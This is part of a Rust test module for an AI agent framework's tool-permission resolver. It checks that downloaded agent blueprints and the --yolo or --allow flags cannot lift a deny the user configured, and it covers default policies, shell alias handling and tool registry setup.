                    &HashMap::new(),
                    &HashMap::new(),
                    &perms,
                    &HashMap::new(),
                    false,
                );
                let unclamped = resolve_policy(
                    tool,
                    true,
                    &HashMap::new(),
                    &HashMap::new(),
                    &perms,
                    &HashMap::new(),
                    true,
                );
                assert_eq!(
                    clamped, unclamped,
                    "{}'s {tool} = {declared:?} changed meaning under the allowlist",
                    agent.name
                );
            }
        }
    }

    #[test]
    fn test_default_policy_read_file() {
        assert_eq!(default_tool_policy("read_file", true), ToolPolicy::Allow);
        assert_eq!(default_tool_policy("list_dir", true), ToolPolicy::Allow);
    }

    #[test]
    fn test_default_policy_write_tools() {
        assert_eq!(default_tool_policy("write_file", true), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("edit_file", true), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("bash", true), ToolPolicy::Ask);
    }

    #[test]
    fn test_default_policy_ask_user_tools_allow_by_default() {
        // These tools ARE the human-in-the-loop mechanism - they must not
        // require a separate approval prompt before asking the user.
        assert_eq!(
            default_tool_policy("ask_user_text", true),
            ToolPolicy::Allow
        );
        assert_eq!(
            default_tool_policy("ask_user_choice", true),
            ToolPolicy::Allow
        );
        assert_eq!(
            default_tool_policy("ask_user_confirm", true),
            ToolPolicy::Allow
        );
        assert_eq!(
            default_tool_policy("edit_document", true),
            ToolPolicy::Allow
        );
    }

    #[test]
    fn test_resolve_policy_launch_override_wins() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_yolo_wins() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    /// A stage may tighten the user's setting.
    #[test]
    fn test_resolve_policy_stage_may_tighten_global() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// ...but it may NOT loosen it. `agent.leviath` is a file the user
    /// downloaded; letting its `[stages.x.tool_permissions]` overrule the user's
    /// own `[tool_permissions]` would let an installed agent self-grant the
    /// shell the user had explicitly denied. (A test asserting the opposite -
    /// that stage "beats" global - codifies the bug, not the design.)
    #[test]
    fn test_resolve_policy_stage_cannot_loosen_global() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "allow".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// The ceiling is only what the user *explicitly* configured. A tool they
    /// have said nothing about is still the blueprint's to set - otherwise the
    /// shipped researcher agent could not pre-approve its own `web_fetch`.
    #[test]
    fn test_resolve_policy_blueprint_free_when_user_silent() {
        let mut agent = HashMap::new();
        agent.insert("web_fetch".to_string(), "allow".to_string());
        let policy = resolve_policy(
            "web_fetch",
            false,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    /// `--yolo` must not lift a `Deny` the user configured. Skipping *prompts*
    /// is what `--yolo` is for; skipping a deny rule is not. An earlier test
    /// asserted the reverse ("--yolo overrides the config deny"), which made a
    /// denied tool reachable from any unattended run.
    #[test]
    fn test_yolo_does_not_override_configured_deny() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// The same holds for a named `--allow`, not just the `--yolo` wildcard.
    #[test]
    fn test_named_allow_does_not_override_configured_deny() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// A blueprint's own `deny` is terminal too - an agent that declares it
    /// never needs a tool doesn't get handed it by an unattended `--yolo`.
    #[test]
    fn test_yolo_does_not_override_blueprint_deny() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "deny".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &agent,
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// What `--yolo` *does* still do: collapse `Ask` to `Allow`.
    #[test]
    fn test_yolo_still_collapses_ask_to_allow() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Ask);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_falls_through_to_default() {
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    // ─── Additional default_tool_policy tests ──────────────────────────────

    #[test]
    fn test_default_policy_unknown_tools() {
        assert_eq!(default_tool_policy("unknown_tool", false), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("mcp_tool", false), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("custom_thing", true), ToolPolicy::Ask);
    }

    // ─── resolve_policy additional scenarios ───────────────────────────────

    /// The agent layer is clamped the same way the stage layer is.
    #[test]
    fn test_resolve_policy_agent_cannot_loosen_global() {
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "allow".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// A global `ask` still bounds a blueprint's `allow` - the user gets their
    /// prompt rather than silent execution.
    #[test]
    fn test_resolve_policy_global_ask_bounds_blueprint_allow() {
        let mut agent = HashMap::new();
        agent.insert("write_file".to_string(), "allow".to_string());
        let mut global = HashMap::new();
        global.insert("write_file".to_string(), ToolPolicy::Ask);
        let policy = resolve_policy(
            "write_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn test_resolve_policy_launch_override_specific_beats_wildcard() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Deny);
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        // Specific tool match checked before wildcard
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_global_overrides_default() {
        let mut global = HashMap::new();
        global.insert("read_file".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "read_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_stage_deny() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_stage_ask() {
        let mut stage = HashMap::new();
        stage.insert("read_file".to_string(), "ask".to_string());
        let policy = resolve_policy(
            "read_file",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn test_resolve_policy_unknown_stage_string_defaults_to_ask() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "unknown_policy".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    // ─── parse_policy_str ──────────────────────────────────────────────────

    #[test]
    fn test_parse_policy_str_values() {
        assert_eq!(parse_policy_str("allow"), ToolPolicy::Allow);
        assert_eq!(parse_policy_str("Allow"), ToolPolicy::Allow);
        assert_eq!(parse_policy_str("ALLOW"), ToolPolicy::Allow);
        assert_eq!(parse_policy_str("deny"), ToolPolicy::Deny);
        assert_eq!(parse_policy_str("Deny"), ToolPolicy::Deny);
        assert_eq!(parse_policy_str("ask"), ToolPolicy::Ask);
        assert_eq!(parse_policy_str("Ask"), ToolPolicy::Ask);
        assert_eq!(parse_policy_str("anything_else"), ToolPolicy::Ask);
        assert_eq!(parse_policy_str(""), ToolPolicy::Ask);
    }

    // ─── ToolRegistry construction ─────────────────────────────────────────

    #[tokio::test]
    async fn test_tool_registry_build_no_mcp() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // Should have built-in tools
        assert!(!registry.builtin_names.is_empty());
        // Should have no MCP tools
        assert!(registry.mcp_tool_defs.is_empty());
    }

    #[tokio::test]
    async fn test_tool_registry_all_tool_defs() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        let all_defs = registry.all_tool_defs();
        assert!(!all_defs.is_empty());

        // Should include known built-in tools
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();
        assert!(names.contains(&"read_file"));
    }

    #[tokio::test]
    async fn test_tool_registry_builtin_names_consistent() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // builtin_names should come from builtins.names()
        let names_from_builtins: HashSet<String> = registry.builtins.names().into_iter().collect();
        assert_eq!(registry.builtin_names, names_from_builtins);
    }

    // ─── resolve_policy full precedence chain ─────────────────────────────

    // ─── session_approval_keys ────────────────────────────────────────────

    fn shell_args(command: &str) -> serde_json::Value {
        serde_json::json!({ "command": command })
    }

    /// `bash` is an alias for `shell`, so it must get the same treatment rather
    /// than falling through to the by-name branch.
    #[test]
    fn the_bash_alias_is_scoped_like_shell() {
        assert_eq!(
            session_approval_keys("bash", &shell_args("ls -la")),
            ["shell:ls"]
        );
    }

    /// Non-shell tools keep keying on the tool name: their arguments do not
    /// widen what the tool can reach the way a command string does.
    #[test]
    fn other_tools_are_keyed_by_name() {
        assert_eq!(
            session_approval_keys("read_file", &serde_json::json!({ "path": "a" })),
            ["read_file"]
        );
    }

    /// A shell call with no `command` argument is malformed; it cannot be
    /// characterized, so it cannot be granted.
    #[test]
    fn a_shell_call_without_a_command_is_not_grantable() {
        assert!(session_approval_keys("shell", &serde_json::json!({})).is_empty());
    }

    /// A launch flag outranks a stage's `ask`, which is the point of `--allow`.
    #[test]
    fn test_resolve_policy_launch_overrides_stage_ask() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "ask".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &stage,
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    /// It does not outrank a stage's `deny` - see
    /// `test_yolo_does_not_override_blueprint_deny` for the rationale.
    #[test]
    fn test_resolve_policy_launch_cannot_override_stage_deny() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &stage,
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_stage_overrides_agent() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "allow".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &agent,
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_agent_overrides_global() {
        let mut agent = HashMap::new();
        agent.insert("write_file".to_string(), "deny".to_string());
        let mut global = HashMap::new();
        global.insert("write_file".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "write_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_wildcard_launch_with_missing_specific() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        // unknown_tool has no specific override, should match wildcard
        let policy = resolve_policy(
            "unknown_tool",
            false,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_mcp_tool_defaults_to_ask() {
        let policy = resolve_policy(
            "mcp_custom_tool",
            false,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn test_resolve_policy_read_file_default_is_allow() {
        let policy = resolve_policy(
            "read_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_list_dir_default_is_allow() {
        let policy = resolve_policy(
            "list_dir",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_write_file_default_is_ask() {
        let policy = resolve_policy(
            "write_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn test_resolve_policy_edit_file_default_is_ask() {
        let policy = resolve_policy(
            "edit_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[tokio::test]
    async fn test_tool_registry_shutdown_no_panic() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        registry.shutdown().await;
    }

    #[tokio::test]
    async fn test_tool_registry_all_defs_includes_subagent() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        let all_defs = registry.all_tool_defs();
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();
        // Should include subagent tools
        assert!(names.contains(&"spawn_agent"));
    }

    // ─── default_tool_policy for all known builtin tools ──────────────────

    #[test]
    fn test_default_policy_search_is_ask() {
        assert_eq!(default_tool_policy("search", true), ToolPolicy::Ask);
    }

    #[test]
    fn test_default_policy_glob_is_ask() {
        assert_eq!(default_tool_policy("glob", true), ToolPolicy::Ask);
    }

    #[test]
    fn test_default_policy_http_request_is_ask() {
        assert_eq!(default_tool_policy("http_request", true), ToolPolicy::Ask);
    }

    #[test]
    fn test_default_policy_read_file_not_builtin_still_allow() {
        // Even if is_builtin is false, the name-based lookup should still match
        assert_eq!(default_tool_policy("read_file", false), ToolPolicy::Allow);
    }

    #[test]
    fn test_default_policy_list_dir_not_builtin_still_allow() {
        assert_eq!(default_tool_policy("list_dir", false), ToolPolicy::Allow);
    }

    /// Policy is matched against the name the model calls, which is always the
    /// canonical `shell`, while a manifest, a config, or a `--allow` flag may
    /// have written `bash`. Every one of those entries used to be dead:
    /// `lev run --allow bash` did nothing at all, and `bash = "ask"` in the
    /// shipped `software-engineer` only behaved as intended because the default
    /// for an unlisted tool is also `ask`.
    #[test]
    fn a_permission_written_as_an_alias_reaches_the_tool() {
        let policy = |layer: &str, spelling: &str, called: &str| {
            let mut launch = HashMap::new();
            let mut stage = HashMap::new();
            let mut agent = HashMap::new();
            let mut global = HashMap::new();
            match layer {
                "launch" => {
                    launch.insert(spelling.to_string(), ToolPolicy::Allow);
                }
                "stage" => {
                    stage.insert(spelling.to_string(), "deny".to_string());
                }
                "agent" => {
                    agent.insert(spelling.to_string(), "deny".to_string());
                }
                _ => {
                    global.insert(spelling.to_string(), ToolPolicy::Deny);
                }
            }
            resolve_policy(called, true, &launch, &stage, &agent, &global, false)
        };

        // Written as the alias, called canonically: the shape every real run has.
        assert_eq!(policy("launch", "bash", "shell"), ToolPolicy::Allow);
        assert_eq!(policy("stage", "bash", "shell"), ToolPolicy::Deny);
        assert_eq!(policy("agent", "bash", "shell"), ToolPolicy::Deny);
        assert_eq!(policy("global", "bash", "shell"), ToolPolicy::Deny);

        // And the reverse, so neither spelling is the privileged one.
        assert_eq!(policy("launch", "shell", "bash"), ToolPolicy::Allow);
        assert_eq!(policy("global", "shell", "bash"), ToolPolicy::Deny);

        // A tool with no alias is unaffected: nothing else starts matching.
        assert_eq!(policy("global", "read_file", "write_file"), ToolPolicy::Ask);
    }

    /// The built-in default is matched canonically too, so the shell's `ask`
    /// applies however the call was spelled.
    #[test]
    fn the_default_shell_policy_covers_both_spellings() {
        assert_eq!(default_tool_policy("shell", true), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("bash", true), ToolPolicy::Ask);
    }

    /// The context tools write the agent's own context regions, not the
    /// filesystem, and they used to fall through to `Ask` - so a run that kept
    /// notes paid a prompt per note, 25 of them on the run that prompted this
    /// work.
    #[test]
    fn the_context_tools_do_not_prompt() {
        for tool in [
            "context_write",
            "context_append",
            "context_read",
            "context_delete",
            "context_list",
            "read_files",
        ] {
            assert_eq!(
                default_tool_policy(tool, true),
                ToolPolicy::Allow,
                "{tool} must not raise a prompt by default"
            );
        }
    }

    // ─── resolve_policy: agent-level deny ─────────────────────────────────

    #[test]
    fn test_resolve_policy_agent_deny() {
        let mut agent = HashMap::new();
        agent.insert("read_file".to_string(), "deny".to_string());
        let policy = resolve_policy(
            "read_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    // ─── resolve_policy: unknown agent-level string defaults to ask ───────

    #[test]
    fn test_resolve_policy_agent_unknown_string_defaults_to_ask() {
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "foobar".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &HashMap::new(),
            false,
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    // ─── resolve_policy: global allows override default ───────────────────

    #[test]
    fn test_resolve_policy_global_allow_overrides_default_ask() {
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &global,
            false,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[tokio::test]
    async fn test_tool_registry_all_defs_includes_all_subagent_tools() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        let all_defs = registry.all_tool_defs();
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();

        for expected in &[
            "spawn_agent",
            "check_agent",
            "wait_for_agent",
            "send_to_agent",
            "kill_agent",
        ] {
            assert!(names.contains(expected));
        }
    }

    // ─── ToolRegistry.builtin_names includes known builtins ───────────────

    #[tokio::test]
    async fn test_tool_registry_builtin_names_has_expected_tools() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // These should be in builtin_names
        for name in &["read_file", "list_dir"] {
            assert!(registry.builtin_names.contains(*name));
        }

        // Subagent tools should NOT be in builtin_names
        assert!(!registry.builtin_names.contains("spawn_agent"));
    }

    // ─── ToolRegistry.all_tool_defs does not duplicate ────────────────────

    #[tokio::test]
    async fn test_tool_registry_all_defs_no_mcp_when_none_configured() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        assert!(registry.mcp_tool_defs.is_empty());

        // Total defs = builtins + subagent tools
        let all_defs = registry.all_tool_defs();
        let builtin_count = registry.builtins.tool_defs().len();
        let subagent_count = leviath_tools::BuiltinTools::subagent_tool_defs().len();
        assert_eq!(all_defs.len(), builtin_count + subagent_count);
    }

    // ─── resolve_policy full chain: all four levels present ───────────────

    /// With every level saying `deny`, nothing lifts it - not the stage, not the
    /// agent, not `--allow`. Asserting `Allow` here would mean a launch flag
    /// beats a unanimous deny.
    #[test]
    fn test_resolve_policy_full_chain_deny_is_terminal() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "deny".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);

        let policy = resolve_policy("bash", true, &launch, &stage, &agent, &global, false);
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// The full chain with nothing denying: stage `ask` is the tightest
    /// configured level, and the launch flag relaxes it.
    #[test]
    fn test_resolve_policy_full_chain_launch_relaxes_ask() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "ask".to_string());
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "ask".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Ask);

        let policy = resolve_policy("bash", true, &launch, &stage, &agent, &global, false);
        assert_eq!(policy, ToolPolicy::Allow);
    }

    // ─── ToolRegistry build with failing MCP server ────────────────────────
    // Exercises the Err branch (lines 52-58): a bad command fails to connect.

    #[tokio::test]
    async fn test_tool_registry_build_with_failing_mcp_server() {
        use leviath_mcp::MCPServerConfig;

        let bad_server = MCPServerConfig::stdio(
            "bad-server",
            "/nonexistent/binary/that/does/not/exist",
            vec![],
        );
        let config = Config {
            mcp_servers: vec![bad_server],
            ..Config::default()
        };

        let workdir = std::env::current_dir().unwrap();
        // Should not panic; the error branch is non-fatal (just a tracing::warn)
        let registry = ToolRegistry::build(workdir, &config).await;

        // MCP tool defs should be empty because connection failed
        assert!(registry.mcp_tool_defs.is_empty());
        // Built-ins should still be present
        assert!(!registry.builtin_names.is_empty());
    }

    // Register a blueprint, spawn a caller entity in the world, then call spawn.
    // Uses multi_thread flavor because exec_spawn internally calls blocking_write().
}
